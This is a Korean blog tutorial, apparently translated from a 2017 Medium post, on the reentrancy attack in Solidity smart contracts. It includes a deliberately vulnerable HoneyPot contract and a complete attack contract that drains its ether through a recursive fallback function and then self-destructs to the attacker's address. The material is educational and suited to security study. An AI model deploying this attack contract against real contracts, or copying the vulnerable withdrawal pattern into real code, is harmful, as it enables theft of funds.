# Re-Entrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack Contract

<br/>

## 1. Introduction

#### HoneyPot.sol

```scala
pragma solidity ^0.4.8;

contract HoneyPot {
  mapping (address => uint) public balances;
  function HoneyPot() payable {
    put();
  }

  function put() payable {
    balances[msg.sender] = msg.value;
  }

  function get() {
    if (!msg.sender.call.value(balances[msg.sender])()) {
      throw;
    }
      balances[msg.sender] = 0;
  }

  function() {
    throw;
  }
}
```

위의 `HoneyPot` 컨트랙트는 5 ether를 원래 갖고 있었으며, 의도적으로 해킹되도록 설계되었다. 이번 포스트에서 어떻게 이 컨트랙트를 공격하고 대부분의 ether를 가져갈 수 있었는지 알아보도록 할 것이다.

<br/>

## 2. The Vulnerable Contract

위 `HoneyPot` 컨트랙트가 하는 일은 각 주소가 `put()` 함수를 통해 저장한 ether의 기록을 저장하고, 나중에 해당 주소에서 `get()` 함수를 통해 ether를 다시 가져갈 수 있게 하는 것이다.

<br/>

위 컨트랙트에서 가장 흥미로운 부분을 살펴보자.

```
mapping (address => uint) public balances;
```

<br/>

위의 코드는 address를 value로 맵핑하고 그 값을 `balances`라는 public variable에 저장한다. 이는 특정 주소에 대한 `HoneyPot balance`를 확인할 수 있도록 해준다.

```
balances[0x675dbd6a9c17E15459eD31ADBc8d071A78B0BF60]
```

<br/>

아래의 `put()` 함수는 컨트랙트에서 ether value가 저장되는 곳이다. 이 때 `msg.sender`는 트랜잭션을 전송한 `sender`의 주소이다.

```
function put() payable {
  balances[msg.sender] = msg.value;
}
```

<br/>

그리고 이제 우리가 공격하게 될 함수인 get() 함수를 보자. 이 함수의 목적은 기존에 다른 addresses가 저장해놓았던 `HoneyPot` 컨트랙트의 `balances`로부터 ether value를 `출금(withdraw)`하는 것이다.

```scala
function get() {
  if (!msg.sender.call.value(balances[msg.sender])()) {
    throw;
  }
  balances[msg.sender] = 0;
}
```

<br/>

위의 코드에서 어떤 부분에 취약점이 있는 것일까?

위의 코드를 잘 살펴보면 HoneyPot 컨트랙트는 오직 ***`msg.sender`에게 `ether`가 잘 전송되었는지를 검사한 후에만 해당 주소의 balance를 `0`으로 설정한다.***

이 부분에 바로 취약점이 있는데, 이 함수가 `recursive`하게 호출될 경우 공격이 가능하며 우리는 이것을 `reentrancy attack`이라고 부른다.

<br/>

이제 공격 컨트랙트를 작성해보도록 하자.

#### HoneyPotCollect.sol

```scala
pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract HoneyPotCollect {
  HoneyPot public honeypot;
  function HoneyPotCollect (address _honeypot) {
    honeypot = HoneyPot(_honeypot);
  }
  function kill () {
    suicide(msg.sender);
  }
  function collect() payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  function () payable {
    if (honeypot.balance >= msg.value) {
      honeypot.get();
    }
  }
}
```

<br/>

위 코드에서는 우선 컴파일에 사용될 solidity의 버전을 설정한다.
그 다음 처음에 작성한 `HoneyPot` 컨트랙트를 `import`한다. 따라서 `HoneyPot` 컨트랙트는 `HoneyPotCollect` 컨트랙트에 의해 참조된다.  
그리고 우리는 컨트랙트 베이스를 `HoneyPotCollect`라고 설정한다.

```scala
pragma solidity ^0.4.8;

import "./HoneyPot.sol";

contract HoneyPotCollect {
  HoneyPot public honeypot;
...
}
```

<br/>

그 다음 우리는 constructor 함수를 정의한다. 이 constructor는 우리가 최초에 `HoneyPotCollect` 컨트랙트를 생성할 때 호출된다.
이 때 우리는 어떤 주소를 함께 전달하는데, 이 주소가 바로 우리가 공격할 `HoneyPot` 컨트랙트가 배포된 주소이다.

```scala
function HoneyPotCollect (address _honeypot) {
    honeypot = HoneyPot(_honeypot);
}
```

<br/>

그 다음에 있는 것은 `kill()` 함수이다. 우리는 `HoneyPot` 컨트랙트로부터 ether를 출금하여 `HoneyPotCollect` 컨트랙트로 전송하려고 한다. 하지만 우리는 또한 그렇게 가져간 ether를 내가 소유한 어떠한 주소로 전송할 것이다. 따라서 공격에 성공한 후에 `HoneyPotCollet` 컨트랙트를 파괴하고 모아진 모든 ether를 `kill()` 함수를 호출하는 주소로 전송하는 기능을 만들었다.

```scala
function kill () {
  suicide(msg.sender);
}
```

<br/>

아래의 `collect()` 함수는 `re-entrancy` 공격을 실행시키는 역할을 할 것이다. 이 함수는 ether를 `HoneyPot`에 저장한 후 곧 바로 출금한다.

```scala
function collect() payable {
  honeypot.put.value(msg.value)();
  honeypot.get();
}
```

<br/>

이 때 `payable` modifier는 `EMV`에게 ether를 받는 것을 허용한다고 알려주기 위함이다.

그리고 가장 마지막에 있는 함수는 `fallback function`이라는 것이다. 이 함수는 이름이 없으며, `HoneyPotCollect` 컨트랙트가 plain ether를 전송받을 때마다 실행된다.

```scala
function () payable {
  if (honeypot.balance >= msg.value) {
    honeypot.get();
  }
}
```

그리고 바로 이곳이 `re-entrancy` 공격이 발생하는 곳이다.

<br/>

## 3. Attack

1. `HoneyPotCollet` 컨트랙트를 배치한 후에, 일정량의 ether와 함께 `collect()` 함수를 호출한다.
2. `HoneyPot` 컨트랙트의 `get()` 함수는 자신을 호출한 주소(`HoneyPotCollect` 주소)가 일정량의 balance를 갖고 있을 때만 해당 주소에게 ether를 전송한다. `HoneyPot` 컨트랙트가 `HoneyPotCollect` 컨트랙트에게 ether를 전송하면 `HoneyPotCollect` 컨트랙트의 `fallback` 함수가 호출된다. 만약 `HoneyPot` 컨트랙트에 balance가 전송된 ether value보다 클 경우 이 `fallback` 함수는 `get()` 함수를 호출하며, 이 과정은 `recursive`하게 반복된다.
3. `get()` 함수 안의 코드에서 호출한 주소의 balance를 0으로 설정하는 것은 오직 ether를 전송한 후에만 이루어진다. 이것은 `HoneyPot` 컨트랙트를 속여서 `HoneyPotCollect` 컨트랙트에게 계속 반복하여 ether를 전송하도록 하여 `HoneyPot` 컨트랙트가 가진 거의 대부분의 ether를 공격자에게 전송하도록 만든다.

<br/>

<br/>

---

### References

\[1\] *Gustavo (Gus) Guimaraes. (2017, May 26). [Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack Contract][1] [Medium Blog Post]*

[1]: https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4




